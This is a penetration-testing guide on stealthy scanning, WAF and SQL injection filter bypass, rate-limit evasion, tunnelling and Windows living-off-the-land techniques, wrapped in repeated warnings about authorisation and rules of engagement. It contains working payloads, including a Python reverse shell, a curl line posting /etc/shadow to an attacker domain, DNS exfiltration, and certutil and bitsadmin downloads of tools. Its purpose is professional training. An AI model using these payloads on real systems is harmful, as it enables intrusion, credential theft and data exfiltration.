# Evasion, Low-Noise Testing, and Filter Bypass

**Read this first.** Everything here is for engagements you have written
authorisation for, and for lab machines you have a login to. The techniques
below assume you already know what you are testing and have confirmed the rules
of engagement permit it.

## Contents

- [What stealth actually means on an engagement](#what-stealth-actually-means-on-an-engagement)
- [Operational safety](#operational-safety-first)
- [Network-level low noise](#network-level-low-noise)
- [WAF and filter bypass](#waf-and-filter-bypass)
- [Injection filter bypass](#injection-filter-bypass)
- [Authentication and rate-limit bypass](#authentication-and-rate-limit-bypass)
- [Egress filtering and tunnels](#egress-filtering-and-tunnels)
- [EDR and antivirus awareness](#edr-and-antivirus-awareness)
- [Living off the land](#living-off-the-land)
- [When not to use any of this](#when-not-to-use-any-of-this)

---

## What stealth actually means on an engagement

The word is misleading, so let me be precise about what a professional means.

It does **not** mean hiding from the client's detection so you can do more.
It means three concrete things:

1. **Not taking their services down.** A noisy scan, a careless payload, or a
   stress test on a production box is a service incident. The client's users are
   affected and the incident is yours to answer for.
2. **Not destroying evidence.** Overwriting a file, restarting a service, or
   killing a process during testing can destroy the very artefact the client
   needs to investigate, and can destroy their data.
3. **Respecting the monitoring contract.** If they said "we are monitoring and
   you may test with these limits", the monitoring is not the obstacle. It is
   the agreement.

If you find yourself actively working to avoid a defender who is not part of the
engagement, stop and check with the client, because you have crossed from testing
into something else.

---

## Operational safety first

The single most useful page in this document, and it is not about bypasses.

```bash
# Never do these without explicit written permission
curl -s -X DELETE "https://<target>/api/users/1"            # never
# UPDATE ... SET email=''                                  # never
# DROP TABLE                                                # never
# rm -rf /var/www                                           # never
# shutdown / restart / service stop                         # never, unless in scope
# stress, and any real denial of service                    # almost never
# bcrypt with 2^62 rounds, or a 10GB zip bomb               # never
```

**Prove access, then stop.** For an injection, a boolean differential is a
complete finding. For a file read, one line of the target file is a complete
finding. For remote code execution, `whoami` output is a complete finding.

The instinct to read more is understandable and it is exactly the instinct that
turns a report into an incident. Write down what you proved, screenshot it, stop,
and if you need more detail, say so in the report and ask.

**Work on your own data.** For BOLA, register two accounts and use your own.
For stored XSS, post to a test endpoint you created. For business logic, order
something you can cancel. This is both safer and more convincing to a triager.

---

## Network-level low noise

```bash
# Scan fewer ports. Most engagements are fine with a documented shortlist.
nmap -p 22,80,135,139,389,443,445,1433,3306,3389,5985,8080,8443,9090 <target>
nmap -p 22,80,443,445,3389 <target>            # a very common Windows shortlist

# Slow down, deliberately
nmap -T2 -oA out <target>
nmap -T1 --scan-delay 2s -oA out <target>
nmap --min-rate 10 --max-retries 1 -oA out <target>

# Instead of a subnet sweep, enumerate and scan the hosts you found
# A /24 sweep is visible. A scan of six known hosts is not.

# Run full-port scans in hours, not during business hours, if the RoE allows
# It is still the same packets, just spread out, and the peak rate is far lower.
```

```bash
# Timing, which matters for more than stealth
# Profile the target at a quiet time first, so you know the baseline load
# before you add to it
# Test resource-heavy endpoints in isolation
# If a request causes a spike, that is a finding to report, not a stress test
```

UDP is the classic "noisy but nobody complained" mistake. A full UDP sweep is
slow, generates tens of thousands of packets, and can trip IDS signatures that
an analyst then has to explain. Target specific ports.

---

## WAF and filter bypass

**Only where the rules of engagement cover it.** A WAF that blocks you is
sometimes a real security control, and working around it is a real part of
testing that control.

First, establish that it is actually a WAF and not a rate limit or an
authentication wall.

```bash
# What does it look like?
curl -sI https://<target>/ | grep -iE "server|via|x-waf|x-protected|akamai|cloudflare|incapsula|sucuri"
# Cloudflare: server: cloudflare
# ModSecurity: server: mod_security or a rule id in the body
# A 406 or 403 with a challenge page, rather than 429, is usually a WAF
```

### URL and path normalisation

```bash
# Case variation
curl -s "https://<target>/Script.js"          # versus /script.js
curl -s "https://<target>/SeArch?q=test"

# Path tricks
curl -s "https://<target>//api//users"
curl -s "https://<target>/api/./users"
curl -s "https://<target>/api/../api/users"
curl -s "https://<target>/api;/users"
curl -s "https://<target>/api%2fusers"

# Extension and suffix tricks, if there is a static file handler
curl -s "https://<target>/admin.php.bak"
curl -s "https://<target>/admin.php%00.txt"
curl -s "https://<target>/admin.php/"

# Trailing characters some normalisers strip
curl -s "https://<target>/admin.html%20"
curl -s "https://<target>/admin%23.html"       # fragment, sent raw
```

### Parameter manipulation

```bash
# Case
curl -s "https://<target>/api?UsErId=1&userid=1"

# Duplicate parameters, first or last wins depending on the parser
curl -s "https://<target>/api?user=me&user=admin"

# Array notation
curl -s "https://<target>/api?user[]=me&user[]=admin"
curl -s "https://<target>/api?user[0]=me&user[1]=admin"

# Pollution, where a parameter is injected into a second place
curl -s "https://<target>/api?user=me&user[role]=admin"
```

### Content-type and method switching

```bash
# Send JSON as form encoding, or the reverse
curl -s -X POST https://<target>/api/login -H "Content-Type: application/x-www-form-urlencoded" -d '{"user":"a","pass":"b"}'
curl -s -X POST https://<target>/api/login -H "Content-Type: application/json" -d 'user=a&pass=b'

# Method override
curl -s -X POST https://<target>/admin -H "X-HTTP-Method-Override: DELETE"
curl -s -X POST https://<target>/admin -H "X-Method-Override: PUT"
curl -s -X GET https://<target>/admin -H "X-HTTP-Method: DELETE"

# TRACE, if enabled, can reflect the request past filters
curl -s -X TRACE https://<target>/api
```

### Header tricks

```bash
# Forwarded headers some applications trust to determine the client IP
curl -s https://<target>/admin -H "X-Forwarded-For: 127.0.0.1"
curl -s https://<target>/admin -H "X-Forwarded-Host: 127.0.0.1"
curl -s https://<target>/admin -H "X-Real-IP: 127.0.0.1"
curl -s https://<target>/admin -H "X-Custom-IP-Authorization: 127.0.0.1"

# These are a genuine finding on their own, tested by a developer
```

**If an IP allowlist trusts `X-Forwarded-For`, that is a real vulnerability**,
and you report it rather than quietly using it. A finding that gets you access
is worth more than the access.

---

## Injection filter bypass

The classic blocklist problem. Blocklists match strings; parsers interpret
structure. The gap between the two is where the bypass lives.

```bash
# Comment injection. /**/ is a comment in every SQL dialect
'/**/OR/**/1=1-- -
' O/**/R 1=1-- -
1'/**/UNION/**/SELECT/**/1,2,3-- -

# Whitespace alternatives
'%09UNION%09SELECT%091'        # tab encoded
'%0aUNION%0aSELECT%0a1'        # newline encoded
'+UNION+SELECT+1'              # plus as space
'%0b'                          # vertical tab, mysql only
'UNION/**/SELECT'              # comment as separator

# Case and inline comments
' uNiOn SeLeCt 1 '
1'/*!UNION*/SELECT'             # MySQL versioned comment, actually executes
1'--+-

# String delimiter tricks
'||'                           # string concatenation, Oracle and Postgres
CONCAT('a','b')                # MySQL
CHAR(97,98,99)                 # build a string from character codes
0x616263                       # hex string, MySQL

# Quoting inside an already-quoted context
'\' OR 1=1-- -
" OR ""="                       # double-quoted context, doubled quote

# Encoding layers. Test which one, if any, the app decodes before filtering.
%27%20OR%20%271%27%3D%271       # single URL encoding
%2527%2520OR%2520%271           # double URL encoding
'\x27                           # hex
\u0027                          # unicode escape, JSON contexts
```

```bash
# The procedure when a payload is blocked
# 1. Confirm the block. Read the exact error, the WAF rule id, the status code.
# 2. Identify what it matches. Send variants one at a time and diff.
# 3. Work through the list above systematically. Change one thing at a time.
# 4. If nothing works, the block may be a real one. That is a finding, not a defeat.
# 5. Never brute-force through a WAF. It generates alerts and it is slow.
```

```bash
# Confirming a bypass actually worked, rather than assuming
curl -s "https://<target>/item?id=1' AND '1'='1" | wc -c
curl -s "https://<target>/item?id=1' AND '1'='2" | wc -c
# Different sizes prove the server is evaluating the expression.
```

---

## Authentication and rate-limit bypass

```bash
# Where the limit lives determines what works
curl -sI https://<target>/login | grep -i "ratelimit\|x-limit\|retry-after"
# A header means an application-layer limit. A 429 with no header is likely
# a reverse proxy, which means the window is per-IP and per-path.
```

```bash
# If it is per-path, another path may not be limited
curl -s -X POST "https://<target>/api/login" -d '...'
curl -s -X POST "https://<target>/api/v2/login" -d '...'
curl -s -X POST "https://<target>/api/auth/login" -d '...'

# If it is per-IP, and you are permitted, another source address is the answer
# On your own authorised network this is legitimate.
# On a client engagement, changing source IP to defeat their control is out of
# scope unless the RoE says otherwise. Ask.
```

```bash
# Distributed rate limits, where the application has seen this before
curl -s -X POST https://<target>/api/login \
  -H "X-Forwarded-For: $(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1)" \
  -d '{"user":"admin","pass":"guess"}'

# Distributed limits often key on the account, not the IP. Password spraying
# one common password across many accounts is the technique that respects them.
netexec smb <target> -u users.txt -p 'Summer2026!' --no-bruteforce
```

**Respect a lockout that exists to protect an account.** Account lockout exists
so an attacker cannot take over a user by guessing. If defeating it would
actually let you compromise a real account, stop and get permission, because at
that point you are about to do real damage.

```bash
# Timing, for blind vulnerabilities behind a rate limit
# One request at a time, with a deliberate pause, and note the timings
# A character-at-a-time approach on a rate-limited endpoint is slow by design.
# That is a signal to move on to another approach, not to speed up.
```

---

## Egress filtering and tunnels

When a network blocks outbound connections, you need a way back. This is normal
on a client network and it is a legitimate part of post-exploitation.

**Confirm the constraint first**, so you report it either way.

```bash
# DNS is usually the least filtered
nslookup <your-domain>
dig +short <your-domain>

# Outbound HTTPS is usually allowed
curl -sI https://<your-domain> | head -1

# ICMP is frequently permitted and usually unmonitored
ping -c 3 <your-domain>

# Raw TCP, rarely allowed but worth one test
nc -zv <your-domain> 443
```

### Tunnels, by situation

```bash
# You have a foothold and need an interactive session reliably
# chisel or ligolo, over HTTPS on port 443, through the tooling already installed
./chisel client <your-ip>:9001 R:socks
# Locally
./chisel server --reverse -p 9001
proxychains4 nmap -Pn -sT -p 1-10000 <internal-host>

# The point of a tunnel is reliability. A stateless one-liner that times out
# every four minutes is not a usable path for scanning, so build the tunnel
# rather than repeatedly trying to squeeze a command through.
```

```bash
# DNS tunnelling. Works where only DNS is allowed.
iodine -f -P dns <domain>
# or dnscat2, which is easier to operate
dnscat2-server <domain>
```

```bash
# ICMP tunnelling, where ping is allowed and little else is
ptunnel -r -l 8000 -h <your-ip> -p 443
```

```bash
# HTTPS tunnel, where only web traffic is allowed
# Both directions, so commands and results get back
./ligolo-proxy -h client -p 443 -l -R 1166
./ligolo-agent -c 10.0.0.1:1166 -iface eth0
```

```bash
# Simple alternative, when you only need a reverse shell and have python on the target
# Sometimes the tool that cannot be detected is the one already on the box
python3 -c "import socket,os,pty
s=socket.socket(); s.connect(('<your-ip>',4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
pty.spawn('/bin/bash')"
```

```bash
# Verify the tunnel before you rely on it. A tunnel that appears to work and
# silently drops traffic wastes more time than no tunnel.
curl -s --proxy socks5h://127.0.0.1:1080 http://<internal-host>/
proxychains4 curl -s http://<internal-host>/
```

### Exfiltration

**Ask before you exfiltrate.** Exfiltrating data is one of the few things that
will get a real engagement stopped, and in several jurisdictions it is the
difference between a penetration test and a criminal offence. Get it in the
RoE, in writing, with a stated data volume.

```bash
# Exfiltration channels, where explicitly agreed
# DNS
dig +short <base64-chunk>.data.<your-domain>
# HTTPS, disguised as an ordinary API call
curl -s -X POST https://<your-domain>/collect -d @/etc/shadow
# ICMP, on systems you control both ends of
ping -p 31337 -c 1 <your-ip>
```

```bash
# A safer approach for most engagements: prove you can read it, and describe
# the read in the report rather than performing it. "This endpoint returns
# /etc/shadow and the response is the file contents" is a complete finding.
# The client can then decide whether to let you demonstrate it further.
```

---

## EDR and antivirus awareness

On a corporate client network, your tooling will be detected. This is normal and
it is not a personal failure.

**Know what you are dealing with.**

```bash
# From a Windows shell
tasklist | findstr /i "defender|sentinel|crowdstrike|cylance|carbon|endgame|fireeye"
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusEnabled
```

**What to do about it:**

1. **Check the RoE.** Many client engagements explicitly exclude or restrict
   evasion tooling, and some clients want to see that your tooling gets caught,
   because the detection capability is part of what they are buying.
2. **Ask the client for an allowlist.** A short list of hashes, paths, or
   certificates to exclude from detection. This is a normal request and a good
   client will have a process for it.
3. **Use what is already installed.** See the next section. Native tools are
   signed, and signed binaries attract dramatically less attention.
4. **Test in the agreed window.** Detection and remediation are part of the
   engagement. A test at 2am in an agreed window is professional; a test at
   2am on your own is not.

```bash
# The mechanism, for understanding what is happening to you
# AMSI intercepts PowerShell and scans the script before it runs
# ETW is a Windows event channel many security products read
# Sysmon logs a great deal of process, file, and registry activity
# A hook in a loaded DLL lets a product inspect and alter what you call
```

```bash
# If you understand and are permitted to test these, the general categories are
# on-disk payloads, in-memory payloads such as shellcode injection, unhooking
# the interception from a loaded library, obfuscation, and signed binary proxies.
# You do not need any of these to pass an OSCP or a lab, and you should not
# need them on a client engagement. Treat them as knowledge, not as workflow.
```

---

## Living off the land

The highest-value habit in this entire document. Tools already on the system are
signed, installed, and permitted by whatever policy governs it, which means they
work when your tooling does not and they leave far less behind.

```bash
# Enumerate using built-in Windows tooling
net user /domain
net group "Domain Admins" /domain
net localgroup Administrators
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
schtasks /query /fo csv /v
quser
systeminfo

# Transfer, using Windows
# PowerShell
powershell -c "Invoke-WebRequest http://<your-ip>:8000/tool.ps1 -OutFile $env:TEMP\tool.ps1"
# certutil, which is on every Windows box
certutil -urlcache -split -f http://<your-ip>:8000/tool.exe C:\Users\Public\tool.exe
# bitsadmin
bitsadmin /transfer job http://<your-ip>:8000/tool.exe C:\Users\Public\tool.exe

# On Linux, whatever is already there
wget, curl, python3, perl, ruby, nc, socat, openssl
```

```bash
# And a reminder about the risk
# These are also what detection looks for. "Living off the land" is not
# undetectable, it is just quieter. On a monitored client network, assume
# everything is logged, and assume the client would be interested to see it.
```

---

## When not to use any of this

Keep this list in mind, because it is longer than the technique list.

- **The target is not yours.** No technique on this page applies to a system you
  have not been authorised to test. There is no exception for "it is only a
  CTF-looking thing" or "I found it and the owner probably wants to know".
- **The rules of engagement say no.** If the RoE excludes WAF bypass,
  credential attacks, or evasion tooling, the RoE wins.
- **You would be taking their service down.** If the technique risks an outage,
  do not use it. Report that the control is fragile instead.
- **You would be locking out a real user.** Account lockout, password reset
  floods, and account deletion all affect real people.
- **You would be accessing real data.** Prove access. Do not exercise it.
- **You are being paid to find the control, not to beat it.** On a red team
  engagement with a defined objective, the objective is the boundary. An
  `assumed breach` engagement has the same constraint.
- **You are unsure.** "Unsure" means ask the client. Every time. Nobody has
  ever been disciplined for asking whether they may test something.

The techniques in this document are the ones you use when the goal is to test
whether a control works. If the goal has become to get somewhere you were not
allowed, stop and talk to someone.
